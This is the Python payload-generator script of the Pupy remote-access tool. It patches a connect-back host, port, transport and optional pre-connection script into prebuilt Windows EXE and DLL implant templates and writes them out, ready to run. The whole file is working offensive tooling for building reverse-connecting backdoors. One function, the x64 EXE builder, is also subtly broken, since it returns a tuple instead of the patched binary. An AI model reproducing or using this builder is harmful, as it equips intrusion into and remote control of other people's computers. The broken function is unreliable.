#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import argparse
import sys
import os.path
import re
from pupylib.utils.network import get_local_ip
from network.conf import transports

def get_edit_pupyx86_dll(host, ip, transport, offline_script=None):
	return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), host, ip, transport, offline_script)

def get_edit_pupyx64_dll(host, ip, transport, offline_script=None):
	return get_edit_binary(os.path.join("payload_templates","pupyx64.dll"), host, ip, transport, offline_script)

def get_edit_pupyx86_exe(host, ip, transport, offline_script=None):
	return get_edit_binary(os.path.join("payload_templates","pupyx86.exe"), host, ip, transport, offline_script)

def get_edit_pupyx64_exe(host, ip, transport, offline_script=None):
	return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), host, ip, transport), offline_script

def get_edit_binary(path, host, port, transport, offline_script=None):
	if not offline_script:
		offline_script=""
	binary=b""
	with open(path, 'rb') as f:
		binary=f.read()
	i=0
	offsets=[]
	while True:
		i=binary.find("####---PUPY_CONFIG_COMES_HERE---####\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", i+1)
		if i==-1:
			break
		offsets.append(i)

	if not offsets:
		raise Exception("Error: the offset to edit the config have not been found")
	elif len(offsets)!=1:
		raise Exception("Error: multiple offsets to edit the config have been found")

	new_conf="HOST=\"%s:%s\"\nTRANSPORTS=[%s,{}]\n%s\n\x00\x00\x00\x00\x00\x00\x00\x00"%(host, port, repr(transport), offline_script)
	if len(new_conf)>4092:
		raise Exception("Error: config or offline script too long")
	binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
	return binary


if __name__=="__main__":
	parser = argparse.ArgumentParser(description='Process some integers.')
	parser.add_argument('-t', '--type', default='exe_x86', choices=['exe_x86','exe_x64','dll_x86','dll_x64'], help="(default: exe_x86)")
	parser.add_argument('-o', '--output', help="output path")
	parser.add_argument('-s', '--offline-script', help="offline python script to execute before starting the connection")
	parser.add_argument('-p', '--port', type=int, default=443, help="connect back ip (default:443)")
	parser.add_argument('--transport', choices=[x for x in transports.iterkeys()], default='tcp_ssl', help="the transport to use ! (the server needs to be configured with the same transport) ")
	parser.add_argument('host', nargs='*', help="connect back host")
	args=parser.parse_args()
	myhost=None
	if not args.host:
		myip=get_local_ip()
		if not myip:
			sys.exit("[-] couldn't find your local IP. You must precise an ip or a fqdn manually")
		myhost=myip
	else:
		myhost=args.host[0]
		if re.match("^.*:[0-9]+$", myhost):#auto fixing errors when entering host:port			
			myhost, p=myhost.rsplit(':',1)
			if args.port==443:
				args.port=p
	script_code=""
	if args.offline_script:
		with open(args.offline_script,'r') as f:
			script_code=f.read()
	outpath=None
	if args.type=="exe_x86":
		binary=get_edit_pupyx86_exe(myhost, args.port, args.transport, script_code)
		outpath="pupyx86.exe"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="exe_x64":
		binary=get_edit_pupyx64_exe(myhost, args.port, args.transport, script_code)
		outpath="pupyx64.exe"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="dll_x64":
		binary=get_edit_pupyx64_dll(myhost, args.port, args.transport, script_code)
		outpath="pupyx64.dll"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="dll_x86":
		binary=get_edit_pupyx86_dll(myhost, args.port, args.transport, script_code)
		outpath="pupyx86.dll"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	else:
		exit("Type %s is invalid."%(args.type))
	print("binary generated with config :")
	print("OUTPUT_PATH = %s"%os.path.abspath(outpath))
	print("HOST = %s:%s"%(myhost, args.port))
	print("TRANSPORT = %s"%args.transport)
	print("OFFLINE_SCRIPT = %s"%args.offline_script)






